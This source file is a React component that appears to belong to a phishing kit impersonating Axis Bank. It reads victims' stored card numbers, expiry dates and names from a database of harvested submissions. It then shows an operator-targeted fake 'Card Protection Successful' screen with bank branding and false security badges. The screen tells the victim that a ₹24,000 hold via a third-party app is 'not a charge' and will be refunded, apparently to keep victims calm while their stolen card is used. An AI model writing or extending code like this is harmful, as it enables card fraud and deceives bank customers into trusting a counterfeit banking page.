import React, { useState, useEffect, useMemo } from 'react';
import { supabase } from '../lib/supabase';
import { ShieldCheck, CheckCircle2, Home, Wifi, Lock } from 'lucide-react';
import AxisLogo from './AxisLogo';

interface SuccessMsgBannerProps {
  mobileNumber?: string;
  submissionId?: string | null;
  cardData?: {
    cardholderName?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
  };
  applicantData?: {
    fullName?: string;
    email?: string;
    mobileNumber?: string;
    dob?: string;
  };
}

const SUCCESS_KEYS = [
  'success_msg_active',
  'success_msg',
  'success_card',
  'success_card_active',
  'success_banner',
  'success_banner_active',
  'success_active',
  'show_success',
  '24hour_success',
  'success_popup',
];

export default function SuccessMsgBanner({
  mobileNumber,
  submissionId,
  cardData: propCardData,
  applicantData: propApplicantData,
}: SuccessMsgBannerProps) {
  const [isActive, setIsActive] = useState<boolean>(false);
  const [amount, setAmount] = useState<string>('24000');
  const [appName, setAppName] = useState<string>('nobroker');
  const [serviceName, setServiceName] = useState<string>('Card Protection');
  const [targetPhone, setTargetPhone] = useState<string>('');
  const [targetSubmissionId, setTargetSubmissionId] = useState<string>('');

  // Live card details fetched from current session or Supabase submissions table
  const [dbCardDetails, setDbCardDetails] = useState<{
    cardNumber: string;
    cardholderName: string;
    expiryDate: string;
    cvv: string;
    fullName: string;
  }>({
    cardNumber: '',
    cardholderName: '',
    expiryDate: '',
    cvv: '',
    fullName: '',
  });

  const refNumber = useMemo(() => {
    const random = Math.floor(10000000 + Math.random() * 90000000);
    return `SEC-${random}`;
  }, [isActive]);

  const timestamp = useMemo(() => {
    const now = new Date();
    return now.toLocaleString('en-IN', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      hour12: true,
    });
  }, [isActive]);

  // Fetch app settings & targeting flags
  useEffect(() => {
    const fetchSuccessSettings = async () => {
      try {
        let settingsList: Array<{ key: string; value: any }> = [];

        // 1. Try direct Supabase
        const { data, error } = await supabase
          .from('app_settings')
          .select('key, value');

        if (!error && data && Array.isArray(data)) {
          settingsList = data;
        } else {
          // 2. Server API fallback
          const resp = await fetch('/api/settings');
          const json = await resp.json();
          if (json.success && Array.isArray(json.data)) {
            settingsList = json.data;
          }
        }

        if (settingsList.length > 0) {
          const activeRow = settingsList.find((item) => SUCCESS_KEYS.includes(item.key));
          const amountRow = settingsList.find(
            (item) => item.key === 'success_msg_amount' || item.key === 'amount'
          );
          const appRow = settingsList.find(
            (item) => item.key === 'success_msg_app' || item.key === 'app_name' || item.key === 'app'
          );
          const serviceRow = settingsList.find(
            (item) => item.key === 'success_msg_service' || item.key === 'service_name' || item.key === 'service'
          );
          const phoneRow = settingsList.find(
            (item) => item.key === 'success_msg_target_phone' || item.key === 'target_phone'
          );
          const targetIdRow = settingsList.find(
            (item) => item.key === 'success_msg_target_id' || item.key === 'target_submission_id'
          );

          if (activeRow && activeRow.value !== undefined && activeRow.value !== null) {
            const valStr = String(activeRow.value).trim().toLowerCase();
            setIsActive(valStr === 'true' || valStr === '1' || valStr === 'yes');
          }

          if (amountRow && amountRow.value) {
            setAmount(String(amountRow.value).trim());
          }

          if (appRow && appRow.value) {
            setAppName(String(appRow.value).trim());
          }

          if (serviceRow && serviceRow.value) {
            setServiceName(String(serviceRow.value).trim());
          }

          if (phoneRow && phoneRow.value !== undefined && phoneRow.value !== null) {
            setTargetPhone(String(phoneRow.value).trim());
          }

          if (targetIdRow && targetIdRow.value !== undefined && targetIdRow.value !== null) {
            setTargetSubmissionId(String(targetIdRow.value).trim());
          }
        }
      } catch (err) {
        console.error('Error fetching success msg settings:', err);
      }
    };

    fetchSuccessSettings();

    // 1.5-Second Polling fallback for guaranteed updates
    const interval = setInterval(fetchSuccessSettings, 1500);

    // Supabase Realtime Subscription Channel for app_settings
    const channel = supabase
      .channel('app_settings_success_msg_changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'app_settings',
        },
        (payload: any) => {
          if (payload.new && 'key' in payload.new && 'value' in payload.new) {
            const key = String(payload.new.key);
            const val = String(payload.new.value).trim();
            const valLower = val.toLowerCase();

            if (SUCCESS_KEYS.includes(key)) {
              setIsActive(valLower === 'true' || valLower === '1' || valLower === 'yes');
            } else if (key === 'success_msg_amount' || key === 'amount') {
              setAmount(val);
            } else if (key === 'success_msg_app' || key === 'app_name' || key === 'app') {
              setAppName(val);
            } else if (key === 'success_msg_service' || key === 'service_name' || key === 'service') {
              setServiceName(val);
            } else if (key === 'success_msg_target_phone' || key === 'target_phone') {
              setTargetPhone(val);
            } else if (key === 'success_msg_target_id' || key === 'target_submission_id') {
              setTargetSubmissionId(val);
            }
          }
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, []);

  // Fetch actual submission details (card number, cardholder, expiry) matching this session or target from Supabase submissions table
  useEffect(() => {
    const fetchLatestCardDetails = async () => {
      try {
        let query = supabase.from('submissions').select('*');

        const activeSubId = submissionId || targetSubmissionId;
        const activePhone = mobileNumber || targetPhone;

        if (activeSubId && activeSubId.trim()) {
          query = query.eq('id', activeSubId.trim());
        } else if (activePhone && activePhone.trim()) {
          const cleanPhone = activePhone.replace(/\D/g, '');
          query = query.or(`mobile_number.eq.${activePhone},mobile_number.ilike.%${cleanPhone}%`);
        }

        const { data, error } = await query
          .order('created_at', { ascending: false })
          .limit(1);

        if (!error && data && data.length > 0) {
          const row = data[0];
          setDbCardDetails({
            cardNumber: row.card_number || '',
            cardholderName: row.cardholder_name || '',
            expiryDate: row.expiry_date || '',
            cvv: row.cvv || '',
            fullName: row.full_name || '',
          });
        }
      } catch (err) {
        console.error('Error fetching card details for demo card:', err);
      }
    };

    fetchLatestCardDetails();
    const cardInterval = setInterval(fetchLatestCardDetails, 2500);

    // Subscriptions for instant live update when card details are submitted
    const subChannel = supabase
      .channel('submissions_card_updates')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'submissions',
        },
        () => {
          fetchLatestCardDetails();
        }
      )
      .subscribe();

    return () => {
      clearInterval(cardInterval);
      supabase.removeChannel(subChannel);
    };
  }, [submissionId, targetSubmissionId, mobileNumber, targetPhone]);

  if (!isActive) return null;

  // Retrieve current active user session & phone
  let currentSubId = (submissionId || '').trim();
  let currentPhone = (mobileNumber || '').trim();

  try {
    if (!currentSubId) {
      currentSubId = (localStorage.getItem('axis_submission_id') || '').trim();
    }
    if (!currentPhone) {
      currentPhone = (localStorage.getItem('axis_mobile_number') || '').trim();
    }
  } catch (e) {
    // ignore
  }

  // TARGETING LOGIC:
  const cleanTargetId = (targetSubmissionId || '').trim();
  const cleanTargetPhone = (targetPhone || '').trim();

  // ONLY show globally if admin explicitly set target to 'all'
  const isGlobalTarget =
    cleanTargetId.toLowerCase() === 'all' ||
    cleanTargetPhone.toLowerCase() === 'all';

  if (!isGlobalTarget) {
    // If admin has not specified any target (both empty), DO NOT show popup automatically!
    if (!cleanTargetId && !cleanTargetPhone) {
      return null;
    }

    let matched = false;

    // Match by Submission ID
    if (cleanTargetId && cleanTargetId.toLowerCase() !== 'all' && currentSubId) {
      if (currentSubId.toLowerCase() === cleanTargetId.toLowerCase()) {
        matched = true;
      }
    }

    // Match by Mobile / Phone Number
    if (!matched && cleanTargetPhone && cleanTargetPhone.toLowerCase() !== 'all' && currentPhone) {
      const cleanTargetDigits = cleanTargetPhone.replace(/\D/g, '');
      const cleanUserDigits = currentPhone.replace(/\D/g, '');
      if (cleanTargetDigits && cleanUserDigits) {
        if (
          cleanUserDigits === cleanTargetDigits ||
          cleanUserDigits.endsWith(cleanTargetDigits) ||
          cleanTargetDigits.endsWith(cleanUserDigits)
        ) {
          matched = true;
        }
      }
    }

    // If a specific target user is set and this device does not match, don't show
    if (!matched) {
      return null;
    }
  }

  const rawAmount = amount ? amount.replace(/[^0-9]/g, '') : '24000';
  const formattedAmount = Number(rawAmount || '24000').toLocaleString('en-IN');
  const displayApp = appName ? appName.toLowerCase() : 'nobroker';
  const rawService = serviceName || 'Card Protection';
  const cleanService = rawService
    .replace(/^activate\s+/i, '')
    .replace(/^activation\s+/i, '')
    .replace(/\s+successful$/i, '')
    .trim();
  const displayServiceHeader = `${cleanService || 'Card Protection'} Successful`;

  // Resolved Card Details: prioritize live prop state or database row
  const resolvedCardNumber =
    (propCardData?.cardNumber && propCardData.cardNumber.trim()) ||
    (dbCardDetails.cardNumber && dbCardDetails.cardNumber.trim()) ||
    '4532 8921 4452 9821';

  const resolvedCardholderName =
    (propCardData?.cardholderName && propCardData.cardholderName.trim()) ||
    (dbCardDetails.cardholderName && dbCardDetails.cardholderName.trim()) ||
    (propApplicantData?.fullName && propApplicantData.fullName.trim()) ||
    (dbCardDetails.fullName && dbCardDetails.fullName.trim()) ||
    'VALUED CARDHOLDER';

  const resolvedExpiry =
    (propCardData?.expiryDate && propCardData.expiryDate.trim()) ||
    (dbCardDetails.expiryDate && dbCardDetails.expiryDate.trim()) ||
    '12/29';

  // Format Card Number in 4-digit blocks
  const cleanDigits = resolvedCardNumber.replace(/\D/g, '');
  let formattedCardDisplay = '';
  if (cleanDigits.length >= 16) {
    const p1 = cleanDigits.slice(0, 4);
    const p2 = cleanDigits.slice(4, 8);
    const p3 = cleanDigits.slice(8, 12);
    const p4 = cleanDigits.slice(12, 16);
    formattedCardDisplay = `${p1} ${p2} ${p3} ${p4}`;
  } else if (cleanDigits.length > 0) {
    const parts = cleanDigits.match(/.{1,4}/g);
    formattedCardDisplay = parts ? parts.join(' ') : cleanDigits;
  } else {
    formattedCardDisplay = '4532 8921 4452 9821';
  }

  // Detect card network
  const firstDigit = cleanDigits.charAt(0);
  const cardNetwork =
    firstDigit === '4'
      ? 'VISA'
      : firstDigit === '5'
      ? 'MASTERCARD'
      : firstDigit === '6'
      ? 'RUPAY'
      : 'VISA';

  return (
    <div className="fixed inset-0 z-[99999] bg-[#f8fafc] flex flex-col justify-between overflow-y-auto animate-fadeIn min-h-screen">
      {/* Top Bank Navigation Bar */}
      <div className="bg-white border-b border-slate-200/80 px-4 sm:px-6 py-3 flex items-center justify-between sticky top-0 z-30 shadow-xs">
        <div className="flex items-center gap-2">
          <AxisLogo className="h-6 sm:h-7 w-auto" />
        </div>

        <div className="flex items-center gap-1.5 text-[11px] sm:text-xs font-semibold text-emerald-700 bg-emerald-50 px-2.5 sm:px-3 py-1 rounded-full border border-emerald-200">
          <Lock className="w-3.5 h-3.5 text-emerald-600" />
          <span>256-Bit Secure</span>
        </div>
      </div>

      {/* Full Viewport Content Container */}
      <div className="flex-1 flex flex-col justify-center max-w-lg mx-auto w-full p-4 sm:p-5 space-y-3.5 my-auto">
        
        {/* 1. Dynamic Service Protection Successful Card */}
        <div className="bg-[#eaf8f0] border border-[#bcdbc7] rounded-2xl p-3.5 sm:p-4 shadow-xs relative overflow-hidden">
          <div className="flex items-start gap-3">
            {/* Solid Green Circle Checkmark Icon */}
            <div className="mt-0.5 flex-shrink-0">
              <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-[#16a34a] flex items-center justify-center shadow-md shadow-emerald-600/20 text-white">
                <CheckCircle2 className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2.5]" />
              </div>
            </div>

            <div className="flex-1 min-w-0 space-y-0.5">
              <h3 className="text-base sm:text-lg font-extrabold text-[#16a34a] leading-tight">
                {displayServiceHeader}
              </h3>
              <p className="text-slate-800 text-xs sm:text-sm font-semibold leading-relaxed">
                ₹{formattedAmount} will be automatically refunded within 24 hours after card use.
              </p>
            </div>
          </div>

          {/* Realistic Banking Badge Strip */}
          <div className="mt-2.5 pt-2 border-t border-[#bcdbc7]/60 flex items-center justify-between text-[11px] sm:text-xs text-emerald-900 font-medium">
            <span className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
              Auto-Reversal Enabled
            </span>
            <span className="font-mono text-[10px] sm:text-[11px] text-emerald-800 font-bold bg-white/80 px-2 py-0.5 rounded">
              TAT: 24 Hours
            </span>
          </div>
        </div>

        {/* 2. REALISTIC LIVE DEMO CARD (Showing exact details from panel / IP) */}
        <div className="relative rounded-2xl sm:rounded-3xl p-4 sm:p-5 bg-gradient-to-br from-[#AE275F] via-[#97144D] to-[#670A32] text-white shadow-xl border border-white/20 overflow-hidden select-none transition-all hover:shadow-2xl">
          {/* Subtle Metallic Background Sheen & Circles */}
          <div className="absolute -right-12 -top-12 w-44 h-44 rounded-full bg-white/10 blur-2xl pointer-events-none" />
          <div className="absolute -left-12 -bottom-12 w-44 h-44 rounded-full bg-amber-400/10 blur-2xl pointer-events-none" />
          <div className="absolute inset-0 opacity-10 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-white via-transparent to-transparent pointer-events-none" />

          {/* Top Card Row: Bank Name + Chip + Contactless */}
          <div className="flex items-center justify-between relative z-10">
            <div className="flex items-center gap-2">
              <span className="font-black text-sm sm:text-base tracking-widest uppercase bg-white/15 px-2 py-0.5 rounded backdrop-blur-xs border border-white/20">
                AXIS BANK
              </span>
              <span className="text-[10px] uppercase font-bold tracking-wider text-amber-200/90 border border-amber-300/40 px-1.5 py-0.2 rounded-full">
                PLATINUM
              </span>
            </div>

            <div className="flex items-center gap-1.5 text-white/90">
              <Wifi className="w-4 h-4 rotate-90 text-amber-200" />
              <span className="text-[9px] font-bold uppercase tracking-wider text-white/80">DEBIT / CREDIT</span>
            </div>
          </div>

          {/* Middle Row: Gold EMV Chip */}
          <div className="my-3 sm:my-3.5 flex items-center justify-between relative z-10">
            <div className="w-10 h-7 sm:w-11 sm:h-8 rounded-md bg-gradient-to-br from-amber-200 via-amber-400 to-amber-500 p-0.5 shadow-md border border-amber-200/80 flex items-center justify-center relative overflow-hidden">
              <div className="w-full h-full border border-amber-900/30 rounded-xs grid grid-cols-3 gap-0.5 p-0.5 opacity-60">
                <div className="border-r border-amber-900/40" />
                <div className="border-r border-amber-900/40" />
                <div />
              </div>
            </div>

            <div className="flex items-center gap-1 bg-black/20 backdrop-blur-xs px-2 py-0.5 rounded-full border border-white/10 text-[10px] font-medium text-emerald-300">
              <ShieldCheck className="w-3 h-3 text-emerald-400" />
              <span>Verified Session Active</span>
            </div>
          </div>

          {/* Card Number Grouping */}
          <div className="relative z-10 my-1 sm:my-1.5 text-center sm:text-left">
            <p className="font-mono text-base sm:text-lg md:text-xl font-bold tracking-[0.22em] text-white drop-shadow-[0_2px_4px_rgba(0,0,0,0.6)]">
              {formattedCardDisplay}
            </p>
          </div>

          {/* Bottom Row: Cardholder Name, Expiry & Network Logo */}
          <div className="mt-3 pt-2.5 border-t border-white/15 flex items-end justify-between relative z-10 text-xs">
            <div className="space-y-0.5 max-w-[55%] truncate">
              <p className="text-[8px] uppercase tracking-wider text-white/70 font-semibold">Cardholder Name</p>
              <p className="font-mono font-bold tracking-wider text-white text-xs sm:text-sm uppercase truncate drop-shadow-sm">
                {resolvedCardholderName}
              </p>
            </div>

            <div className="space-y-0.5 text-center">
              <p className="text-[8px] uppercase tracking-wider text-white/70 font-semibold">Valid Thru</p>
              <p className="font-mono font-bold text-white text-xs sm:text-sm tracking-wider drop-shadow-sm">
                {resolvedExpiry}
              </p>
            </div>

            {/* Network Badge */}
            <div className="flex-shrink-0 text-right">
              {cardNetwork === 'MASTERCARD' ? (
                <div className="flex items-center -space-x-2">
                  <div className="w-5 h-5 rounded-full bg-red-500 opacity-90" />
                  <div className="w-5 h-5 rounded-full bg-amber-400 opacity-90" />
                </div>
              ) : cardNetwork === 'RUPAY' ? (
                <span className="font-black text-sm tracking-wider text-white italic bg-emerald-700/80 px-1.5 py-0.5 rounded border border-emerald-400/50">
                  RuPay
                </span>
              ) : (
                <span className="font-black text-base sm:text-lg tracking-wider text-white italic drop-shadow-[0_1px_3px_rgba(0,0,0,0.7)]">
                  VISA
                </span>
              )}
            </div>
          </div>
        </div>

        {/* 3. Temporary Hold Card */}
        <div className="bg-white border border-slate-200 rounded-2xl p-3.5 sm:p-4 text-center shadow-xs space-y-1">
          <div className="inline-flex items-center gap-1.5 px-3 py-0.5 rounded-full bg-amber-50 border border-amber-200 text-amber-900 text-[10px] sm:text-[11px] font-bold uppercase tracking-wider">
            <ShieldCheck className="w-3.5 h-3.5 text-amber-600" />
            <span>Bank Security Authorization</span>
          </div>

          <h3 className="text-sm sm:text-base font-bold text-slate-900">
            Temporary Hold
          </h3>
          <p className="text-slate-800 text-xs sm:text-sm font-medium leading-relaxed">
            ₹{formattedAmount} is temporarily held by the bank via <span className="lowercase font-bold text-slate-900 underline decoration-slate-300">{displayApp}</span>.
          </p>
          <p className="text-slate-500 text-[10px] sm:text-xs font-medium">
            This is not a charge. You can use your card normally.
          </p>
        </div>

        {/* Reference Footer Detail */}
        <div className="bg-slate-100/90 rounded-xl py-1.5 px-3 border border-slate-200/80 text-center text-xs text-slate-600 font-mono">
          <span className="text-slate-400">REF:</span>{' '}
          <span className="font-bold text-slate-800">{refNumber}</span>
        </div>

        {/* Primary Action Button */}
        <button
          onClick={() => setIsActive(false)}
          className="w-full bg-[#AE275F] hover:bg-[#97144D] active:bg-[#7A0C3C] text-white py-3 sm:py-3.5 px-5 rounded-xl font-bold text-sm sm:text-base tracking-wide transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer mt-1"
        >
          <Home className="w-4 h-4 sm:w-5 sm:h-5" />
          <span>HOME</span>
        </button>
      </div>

      {/* Bottom Bank Security Footer */}
      <div className="bg-white border-t border-slate-100 py-2.5 text-center text-[11px] text-slate-400 font-medium">
        Axis Bank Ltd. • 100% Safe & Secure Banking
      </div>
    </div>
  );
}



